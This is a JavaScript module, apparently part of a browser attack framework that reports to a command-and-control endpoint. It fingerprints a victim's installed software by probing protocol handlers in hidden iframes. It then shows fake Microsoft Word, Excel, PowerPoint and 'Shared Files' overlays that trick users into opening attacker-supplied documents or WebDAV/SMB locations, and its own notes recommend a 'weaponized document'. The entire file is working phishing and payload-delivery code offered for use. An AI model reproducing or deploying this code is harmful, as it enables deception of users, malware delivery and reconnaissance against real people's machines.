var C2 = location.protocol + '//' + location.host;
var CID = window.__pzCid || '';
var PAYLOAD_URL = '{{param}}' || '';

// ── 1. Detect installed apps via protocol handler probing ────────────────────
// Modern browsers show a prompt, but we can detect if the handler EXISTS
// by checking if the browser navigates vs stays. We use iframe + timeout.
var PROTOCOLS = [
  // Office
  { name: 'Microsoft Word',   proto: 'ms-word:', test: 'ms-word:ofe|u|about:blank', attack: true },
  { name: 'Microsoft Excel',  proto: 'ms-excel:', test: 'ms-excel:ofe|u|about:blank', attack: true },
  { name: 'Microsoft PowerPoint', proto: 'ms-powerpoint:', test: 'ms-powerpoint:ofe|u|about:blank', attack: true },
  { name: 'Microsoft Teams',  proto: 'msteams:', test: 'msteams://about:blank' },
  { name: 'Microsoft Outlook', proto: 'ms-outlook:', test: 'ms-outlook:' },
  // Dev tools
  { name: 'VS Code',          proto: 'vscode:', test: 'vscode://file/tmp' },
  { name: 'VS Code Insiders', proto: 'vscode-insiders:', test: 'vscode-insiders://file/tmp' },
  { name: 'JetBrains IDE',    proto: 'jetbrains:', test: 'jetbrains://navigate' },
  { name: 'Sublime Text',     proto: 'subl:', test: 'subl://open' },
  // Communication
  { name: 'Slack',            proto: 'slack:', test: 'slack://open' },
  { name: 'Discord',          proto: 'discord:', test: 'discord://-/' },
  { name: 'Zoom',             proto: 'zoommtg:', test: 'zoommtg://zoom.us/join' },
  { name: 'Skype',            proto: 'skype:', test: 'skype:?chat' },
  { name: 'Telegram',         proto: 'tg:', test: 'tg://resolve?domain=test' },
  { name: 'Signal',           proto: 'signal:', test: 'signal://signal.me' },
  // Crypto wallets
  { name: 'Ledger Live',      proto: 'ledgerlive:', test: 'ledgerlive://' },
  // Remote access
  { name: 'RDP Client',       proto: 'rdp:', test: 'rdp://' },
  { name: 'SSH Client',       proto: 'ssh:', test: 'ssh://localhost' },
  { name: 'AnyDesk',          proto: 'anydesk:', test: 'anydesk:' },
  { name: 'TeamViewer',       proto: 'teamviewer8:', test: 'teamviewer8://' },
  // Browsers
  { name: 'Brave',            proto: 'brave:', test: 'brave://settings' },
  { name: 'Tor Browser',      proto: 'tor:', test: 'tor://' },
  // Gaming
  { name: 'Steam',            proto: 'steam:', test: 'steam://open/games' },
  { name: 'Epic Games',       proto: 'com.epicgames.launcher:', test: 'com.epicgames.launcher://apps' },
  // VPN
  { name: 'WireGuard',        proto: 'wireguard:', test: 'wireguard://' },
  // Password managers
  { name: '1Password',        proto: 'onepassword:', test: 'onepassword://' },
  { name: 'Bitwarden',        proto: 'bitwarden:', test: 'bitwarden://' },
];

var detected = [];
var probesDone = 0;

// Use a hidden iframe to test protocol handlers
// If the browser supports the protocol, the iframe navigates (or prompts)
// We can detect some via error events
function probeProtocol(info, callback) {
  var iframe = document.createElement('iframe');
  iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
  iframe.sandbox = ''; // Prevent actual navigation but detect handler

  var resolved = false;
  function done(found) {
    if (resolved) return;
    resolved = true;
    try { document.body.removeChild(iframe); } catch(e) {}
    callback(found);
  }

  // Try using navigator.registerProtocolHandler check (limited)
  // and fall back to blur detection (if browser shows prompt, window loses focus)
  iframe.onerror = function() { done(false); };

  document.body.appendChild(iframe);

  // Alternative: use an <a> element with ping and check via blur
  try {
    iframe.contentWindow.location = info.test;
    // If no error, protocol might exist
    setTimeout(function() { done('maybe'); }, 200);
  } catch(e) {
    // SecurityError = handler exists but blocked by sandbox
    if (e.name === 'SecurityError') done(true);
    else done(false);
  }
}

// ── 2. Attack functions ──────────────────────────────────────────────────────

// Office document delivery — opens remote doc in Word/Excel/PPT
function officeAttack(app, url) {
  var schemes = {
    'word': 'ms-word:ofe|u|',
    'excel': 'ms-excel:ofe|u|',
    'powerpoint': 'ms-powerpoint:ofe|u|'
  };
  var scheme = schemes[app];
  if (!scheme) return false;

  // Create a convincing link the user wants to click
  var overlay = document.createElement('div');
  overlay.id = '__pzProtoOverlay';
  overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.98);z-index:2147483647;display:flex;align-items:center;justify-content:center;font-family:Segoe UI,Roboto,Arial,sans-serif';

  var icon = app === 'word' ? '#185ABD' : app === 'excel' ? '#107C41' : '#C43E1C';
  var label = app === 'word' ? 'Word' : app === 'excel' ? 'Excel' : 'PowerPoint';
  var ext = app === 'word' ? '.docx' : app === 'excel' ? '.xlsx' : '.pptx';

  overlay.innerHTML = '<div style="text-align:center;max-width:500px;padding:40px">'
    + '<div style="width:80px;height:80px;border-radius:12px;background:'+icon+';display:inline-flex;align-items:center;justify-content:center;margin-bottom:20px">'
    + '<span style="color:#fff;font-size:28px;font-weight:700">'+label.charAt(0)+'</span></div>'
    + '<h2 style="color:#202124;font-weight:400;margin:0 0 8px">Open in Microsoft '+label+'</h2>'
    + '<p style="color:#5f6368;font-size:14px;margin:0 0 24px">This document requires Microsoft '+label+' to view. Click below to open it securely.</p>'
    + '<div style="background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:16px;margin-bottom:24px;display:flex;align-items:center;gap:12px">'
    + '<div style="width:40px;height:40px;background:'+icon+';border-radius:4px;display:flex;align-items:center;justify-content:center"><span style="color:#fff;font-weight:700">'+label.charAt(0)+'</span></div>'
    + '<div style="text-align:left"><div style="font-weight:500;color:#202124">document'+ext+'</div><div style="font-size:12px;color:#5f6368">Shared via secure link</div></div></div>'
    + '<button id="__pzProtoOpen" style="background:'+icon+';color:#fff;border:none;border-radius:6px;padding:12px 32px;font-size:15px;cursor:pointer;font-family:inherit">Open in '+label+'</button>'
    + '<p style="color:#999;font-size:11px;margin:16px 0 0">Protected by Microsoft Information Protection</p>'
    + '</div>';

  document.body.appendChild(overlay);

  document.getElementById('__pzProtoOpen').onclick = function() {
    // This triggers the browser's "Open Microsoft Word?" prompt
    // User clicks "Open" → Word opens the attacker's document
    window.location = scheme + url;

    fetch(C2 + '/result', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cid: CID, cmd_id: 'proto_handler_attack', result: {
        type: 'office_uri',
        app: label,
        payload_url: url,
        clicked: true,
        timestamp: new Date().toISOString()
      }})
    }).catch(function(){});

    setTimeout(function() { overlay.remove(); }, 3000);
  };

  return true;
}

// search-ms: attack — opens Explorer showing attacker's WebDAV files
function searchMsAttack(webdavUrl) {
  var overlay = document.createElement('div');
  overlay.id = '__pzProtoOverlay';
  overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.98);z-index:2147483647;display:flex;align-items:center;justify-content:center;font-family:Segoe UI,Roboto,Arial,sans-serif';

  overlay.innerHTML = '<div style="text-align:center;max-width:500px;padding:40px">'
    + '<div style="width:80px;height:80px;border-radius:12px;background:#0078D4;display:inline-flex;align-items:center;justify-content:center;margin-bottom:20px">'
    + '<svg width="40" height="40" fill="#fff" viewBox="0 0 24 24"><path d="M10 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg></div>'
    + '<h2 style="color:#202124;font-weight:400;margin:0 0 8px">Shared Files Available</h2>'
    + '<p style="color:#5f6368;font-size:14px;margin:0 0 24px">Your team has shared files with you. Click below to view them in File Explorer.</p>'
    + '<button id="__pzProtoSearch" style="background:#0078D4;color:#fff;border:none;border-radius:6px;padding:12px 32px;font-size:15px;cursor:pointer;font-family:inherit">View Shared Files</button>'
    + '</div>';

  document.body.appendChild(overlay);

  document.getElementById('__pzProtoSearch').onclick = function() {
    window.location = 'search-ms:query=Documents&crumb=location:' + webdavUrl;

    fetch(C2 + '/result', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cid: CID, cmd_id: 'proto_handler_attack', result: {
        type: 'search_ms',
        webdav_url: webdavUrl,
        clicked: true,
        timestamp: new Date().toISOString()
      }})
    }).catch(function(){});

    setTimeout(function() { overlay.remove(); }, 3000);
  };

  return true;
}

// ── 3. Determine attack based on param ───────────────────────────────────────
// Param format: "word:https://attacker/doc.docx" or "excel:https://..." or "search:smb://..." or "scan"
var parts = PAYLOAD_URL.split(':');
var mode = parts[0].toLowerCase();
var targetUrl = PAYLOAD_URL.slice(mode.length + 1);

if (mode === 'scan' || !PAYLOAD_URL) {
  // Protocol scanning mode — detect installed software
  var scanResults = { detected: [], os_hint: navigator.platform, ua: navigator.userAgent };
  var left = PROTOCOLS.length;

  PROTOCOLS.forEach(function(info) {
    probeProtocol(info, function(found) {
      if (found) {
        scanResults.detected.push({ name: info.name, protocol: info.proto, confidence: found === true ? 'high' : 'low' });
      }
      if (!--left) {
        // Also detect OS from UA for context
        var ua = navigator.userAgent;
        if (/Windows/.test(ua)) scanResults.os = 'Windows';
        else if (/Mac/.test(ua)) scanResults.os = 'macOS';
        else if (/Linux/.test(ua)) scanResults.os = 'Linux';
        else if (/Android/.test(ua)) scanResults.os = 'Android';
        else if (/iPhone|iPad/.test(ua)) scanResults.os = 'iOS';

        scanResults.attackable = scanResults.detected.filter(function(d) {
          return /Word|Excel|PowerPoint/.test(d.name);
        }).map(function(d) { return d.name; });

        scanResults.note = scanResults.attackable.length
          ? 'Office apps detected — use word:/excel:/powerpoint: mode with a payload URL to deliver a weaponized document'
          : 'No Office apps detected — try search: mode for WebDAV delivery or use social engineering modules instead';

        __pzResult(scanResults);
      }
    });
  });

} else if (mode === 'word' || mode === 'excel' || mode === 'powerpoint') {
  officeAttack(mode, targetUrl);
  return 'Office URI overlay shown — waiting for user click to open ' + mode + ' with ' + targetUrl;

} else if (mode === 'search') {
  searchMsAttack(targetUrl);
  return 'search-ms overlay shown — waiting for user click to open Explorer with ' + targetUrl;

} else if (mode === 'custom') {
  // Custom protocol trigger with social engineering overlay
  var overlay = document.createElement('div');
  overlay.id = '__pzProtoOverlay';
  overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:2147483647;display:flex;align-items:center;justify-content:center;font-family:-apple-system,sans-serif';
  overlay.innerHTML = '<div style="background:#fff;border-radius:12px;padding:32px;max-width:400px;text-align:center">'
    + '<h3 style="margin:0 0 12px">Application Required</h3>'
    + '<p style="color:#666;margin:0 0 20px">This content requires an external application. Click to continue.</p>'
    + '<button id="__pzProtoCustom" style="background:#007bff;color:#fff;border:none;border-radius:6px;padding:10px 24px;cursor:pointer">Open Application</button></div>';
  document.body.appendChild(overlay);

  document.getElementById('__pzProtoCustom').onclick = function() {
    window.location = targetUrl; // Full custom URI like vscode://file/path
    fetch(C2 + '/result', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cid: CID, cmd_id: 'proto_handler_attack', result: { type: 'custom', uri: targetUrl, clicked: true } })
    }).catch(function(){});
    setTimeout(function() { overlay.remove(); }, 2000);
  };

  return 'custom protocol overlay shown for: ' + targetUrl;

} else {
  return 'unknown mode: ' + mode + '. Use: scan, word:URL, excel:URL, powerpoint:URL, search:URL, custom:URI';
}

return '__async__';
